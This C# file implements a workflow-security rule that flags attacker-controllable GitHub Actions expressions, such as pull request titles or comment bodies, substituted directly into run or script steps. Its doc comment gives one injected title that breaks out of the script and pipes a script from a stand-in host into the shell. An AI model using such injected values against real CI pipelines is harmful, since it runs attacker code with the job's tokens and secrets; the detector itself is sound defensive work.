using System.Text.RegularExpressions;
using DevSecOpsSentinel.Application;
using DevSecOpsSentinel.Domain;

namespace DevSecOpsSentinel.Infrastructure.Rules;

/// <summary>
/// Detects attacker-controllable workflow expressions interpolated directly into
/// a script body.
///
/// GitHub substitutes <c>${{ }}</c> expressions into the script before the shell
/// or JavaScript interpreter sees it, so a value an attacker can set becomes code
/// rather than data. A pull request title of <c>a"; curl evil.sh | sh; #</c> runs
/// on the runner with whatever token and secrets the job holds.
///
/// The rule reports only contexts an unprivileged third party can influence.
/// Expressions in <c>if:</c> conditions and other YAML positions are deliberately
/// not reported: those are evaluated by the expression engine, not the shell.
/// </summary>
public sealed partial class ScriptInjectionRule : IWorkflowSecurityRule
{
    public string RuleId => "GHA005";

    public string Title =>
        "Untrusted workflow expression is interpolated into a script body";

    public WorkflowSeverity Severity => WorkflowSeverity.Critical;

    /// <summary>
    /// Contexts an unprivileged third party can set. Prefix matches, so
    /// <c>github.event.commits</c> covers <c>commits[0].author.email</c>.
    /// Contexts that require repository write access to influence — notably
    /// <c>github.event.inputs</c> — are excluded to keep the rule precise.
    /// </summary>
    private static readonly string[] UntrustedContexts =
    [
        "github.event.issue.title",
        "github.event.issue.body",
        "github.event.pull_request.title",
        "github.event.pull_request.body",
        "github.event.pull_request.head.ref",
        "github.event.pull_request.head.label",
        "github.event.pull_request.head.repo.description",
        "github.event.pull_request.head.repo.homepage",
        "github.event.pull_request.head.repo.default_branch",
        "github.event.comment.body",
        "github.event.review.body",
        "github.event.review_comment.body",
        "github.event.discussion.title",
        "github.event.discussion.body",
        "github.event.head_commit.message",
        "github.event.head_commit.author.email",
        "github.event.head_commit.author.name",
        "github.event.commits",
        "github.event.pages",
        "github.head_ref"
    ];

    public IReadOnlyList<WorkflowFinding> Evaluate(ParsedWorkflow workflow)
    {
        List<WorkflowFinding> findings = [];

        // Multi-line run:/script: bodies are withheld from Lines by the parser.
        foreach (WorkflowScriptBlock block in workflow.ScriptBlocks)
        {
            foreach (WorkflowLine line in block.Content)
            {
                Collect(findings, line);
            }
        }

        // Single-line run:/script: values remain ordinary YAML lines.
        foreach (WorkflowLine line in workflow.Lines)
        {
            if (IsInlineScriptValue(line.Text))
            {
                Collect(findings, line);
            }
        }

        return findings;
    }

    private void Collect(List<WorkflowFinding> findings, WorkflowLine line)
    {
        foreach (Match match in ExpressionRegex().Matches(line.Text))
        {
            string expression = match.Groups["expression"].Value;
            string? context = FindUntrustedContext(expression);

            if (context is null)
            {
                continue;
            }

            findings.Add(new WorkflowFinding(
                RuleId,
                Severity,
                Title,
                $"'{context}' can be set by anyone who can open a pull request, " +
                "issue, or comment. It is substituted into the script before " +
                "execution, so its value is treated as code.",
                line.Number,
                "Bind the expression to an environment variable on the step, " +
                "then reference the variable from the script so the value stays " +
                "data. For example: env: TITLE: ${{ ... }} and then \"$TITLE\".",
                false));
        }
    }

    private static string? FindUntrustedContext(string expression)
    {
        string normalized = expression.Replace(" ", string.Empty, StringComparison.Ordinal);

        return UntrustedContexts.FirstOrDefault(context =>
            normalized.Contains(context, StringComparison.OrdinalIgnoreCase));
    }

    /// <summary>
    /// True for a run:/script: mapping whose value is on the same line. Block
    /// scalar headers return false, because their content is reported through
    /// <see cref="ParsedWorkflow.ScriptBlocks"/> instead.
    /// </summary>
    private static bool IsInlineScriptValue(string text)
    {
        string candidate = text;

        if (candidate.StartsWith("- ", StringComparison.Ordinal))
        {
            candidate = candidate[2..].TrimStart();
        }

        int colonIndex = candidate.IndexOf(':');
        if (colonIndex <= 0)
        {
            return false;
        }

        string key = candidate[..colonIndex].Trim();
        if (key is not ("run" or "script"))
        {
            return false;
        }

        string value = candidate[(colonIndex + 1)..].Trim();

        return value.Length > 0 && value[0] is not ('|' or '>');
    }

    [GeneratedRegex(@"\$\{\{(?<expression>[^}]*)\}\}")]
    private static partial Regex ExpressionRegex();
}
